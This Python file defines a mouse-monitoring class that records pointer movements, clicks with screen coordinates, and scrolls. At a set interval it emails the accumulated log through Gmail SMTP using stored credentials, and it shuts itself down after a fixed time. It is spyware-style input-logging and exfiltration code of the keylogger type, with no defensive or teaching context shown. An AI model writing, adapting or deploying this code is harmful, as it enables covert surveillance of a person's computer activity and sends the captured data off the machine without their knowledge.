from pynput import mouse
import threading, smtplib
import datetime, sys

# =================================================================
#   MOUSE HANDLEER CLASS WHICH STORES/SEND MOUSE LOGS TO EMAIL
# =================================================================
class MouseHandle:

    # ---------------------------------------------------------------------------------
    #   INIITALIZE CONSTURCTOR FOR EMAIL, PASSWORD, MAIL TIME INTERVAL, INTERRUPT TIME
    # ---------------------------------------------------------------------------------
    def __init__(self, email, password, time_interval, terminate):
        self.log = ''
        self.email = email
        self.password = password
        self.time_interval = time_interval
        self.terminate = terminate
        self.pasttime = datetime.datetime.now()
        self.mouse_handler = mouse.Listener(on_move=self.process_move, on_click=self.process_click, on_scroll=self.process_scroll)

    # -----------------------------------------------------------------------------------
    #   THIS METHOD ACTIVATE WHEN MOUSE MOVES AND STORES MOVE LOGS BASED ON X AND Y AXIS
    # ------------------------------------------------------------------------------------
    def process_move(self, x, y):
        self.log = self.log + ' Pointer Moved to {0}'.format((x,y))

    # ---------------------------------------------------------------------------------------------------
    #   THIS METHOD ACTIVATE WHEN MOUSE CLICKS (LEFT CLICK, MIDDLE CLICK, RIGHT CLICK) STORES CLICK LOGS
    # ---------------------------------------------------------------------------------------------------
    def process_click(self, x, y, button, pressed):
        if button == mouse.Button.left:
            self.log = self.log + ' Left Button Clicked at {0}'.format((x, y))

        if button == mouse.Button.right:
            self.log = self.log + ' Right Button Clicked'
        if button == mouse.Button.middle:
            self.log = self.log + ' Middle Button Clicked'

    # --------------------------------------------
    #   THIS METHOD ACTIVATE WHEN MOUSE SCROLLS
    # --------------------------------------------
    def process_scroll(self, x, y, dx, dy):
        self.log = self.log + ' Scorlled {0} at {1}'.format('down' if dy < 0 else 'up', (x,y))

    # --------------------------------
    #   SEND LOGS TO EMAIL
    # --------------------------------
    def send_mail(self, email, password, res):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, res)

    # ------------------------------------------------------------------
    #   THIS METHOD SEND LOGS TOGETHER AT A TIME BASED ON TIME INTERVAL
    # ------------------------------------------------------------------
    def report(self):
        present_time = datetime.datetime.now()
        diff_time = (present_time - self.pasttime).seconds
        if diff_time >= self.terminate:
            self.mouse_handler.stop()
            sys.exit(0)
        else:
            self.send_mail(self.email, self.password, self.log)
            self.log = ''
            timer = threading.Timer(self.time_interval, self.report)
            timer.start()

    # ---------------------------------------------
    #   MAIN METHOD TO CREATE MOUSE HANDLER THREAD
    # ---------------------------------------------
    def run(self):
        self.mouse_handler.start()
        self.report()

